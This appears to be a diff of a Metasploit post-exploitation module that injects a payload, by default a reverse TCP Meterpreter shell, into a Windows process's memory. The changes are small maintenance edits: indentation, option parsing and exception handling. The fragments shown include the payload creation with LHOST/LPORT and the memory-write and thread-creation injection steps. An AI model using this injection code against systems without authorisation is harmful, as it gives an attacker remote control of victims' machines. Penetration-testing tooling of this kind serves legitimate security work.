@@ -16,18 +16,19 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Windows Manage Memory Payload Injection Module',
-				'Description'   => %q{
-					This module will inject into the memory of a process a specified windows payload.
-					If a payload or process is not provided one will be created by default
-					using a reverse x86 TCP Meterpreter Payload.
-				},
-				'License'       => MSF_LICENSE,
-				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
-				'SessionTypes'  => [ 'meterpreter' ]
-			))
+			'Name'          => 'Windows Manage Memory Payload Injection Module',
+			'Description'   => %q{
+				This module will inject into the memory of a process a specified windows payload.
+				If a payload or process is not provided one will be created by default
+				using a reverse x86 TCP Meterpreter Payload.
+			},
+			'License'       => MSF_LICENSE,
+			'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+			'Version'       => '$Revision$',
+			'Platform'      => [ 'windows' ],
+			'SessionTypes'  => [ 'meterpreter' ]
+		))
+
 		register_options(
 			[
 				OptString.new('PAYLOAD',
@@ -99,20 +100,18 @@ class Metasploit3 < Msf::Post
 
 	# Create a payload given a name, lhost and lport, additional options
 	def create_payload(name, lhost, lport, opts = "")
-
 		pay = client.framework.payloads.create(name)
 		pay.datastore['LHOST'] = lhost
 		pay.datastore['LPORT'] = lport
 		if not opts.empty?
 			opts.split(",").each do |o|
-				opt,val = o.split("=")
+				opt,val = o.split("=",2)
 				pay.datastore[opt] = val
 			end
 		end
 		# Validate the options for the module
 		pay.options.validate(pay.datastore)
 		return pay
-
 	end
 
 	# Starts a multi/handler session
@@ -199,9 +198,9 @@ class Metasploit3 < Msf::Post
 				host_process.memory.write(mem, raw)
 				host_process.thread.create(mem, 0)
 				print_good("Successfully injected payload in to process: #{pid}")
-			rescue::Exception => e
+			rescue ::Exception => e
 				print_error("Failed to Inject Payload to #{pid}!")
-				print_error(e)
+				print_error(e.to_s)
 			end
 		end
 	end
